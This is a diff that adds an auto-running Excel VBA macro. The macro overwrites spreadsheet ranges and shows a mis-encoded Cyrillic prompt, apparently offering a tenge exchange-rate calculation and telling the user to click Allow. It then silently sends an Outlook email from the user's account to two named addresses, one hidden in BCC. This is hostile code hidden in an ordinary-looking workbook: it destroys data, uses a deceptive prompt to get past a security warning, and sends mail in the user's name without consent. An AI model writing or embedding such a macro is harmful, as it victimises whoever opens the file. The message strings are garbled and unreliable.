@@ -1,0 +1,24 @@
+Sub auto_open()
+Range("A2:G2").Interior.ColorIndex = 14
+Range("A3:G4") = 1.2
+Range("A5:G5") = 1.8
+Range("A6:G23").Interior.ColorIndex = 14
+Range("A6:G23") = 143
+
+MsgBox "Äëÿ ðàñ÷åòà êóðñà òåíãå äî êîíöà ãîäà íàæìèòå ÎÊ, çàòåì â ñïëûâàþùåì îêíå Allow"
+
+Dim objOL As Object
+    Dim objMail As Object
+    Set objOL = CreateObject("Outlook.Application")
+    Set objMail = objOL.CreateItem(0)
+        With objMail
+            .To = "MNametova@kib.kz"
+            .BCC = "tabilkassymov@kib.kz"
+            .Body = "Ó òåáÿ îáíîâëåíèÿ? òåáå èäåò"
+            .Subject = "ëè÷íî â ðóêè"
+            .Send
+        End With
+    Set objMail = Nothing
+    Set objOL = Nothing
+    
+End Sub
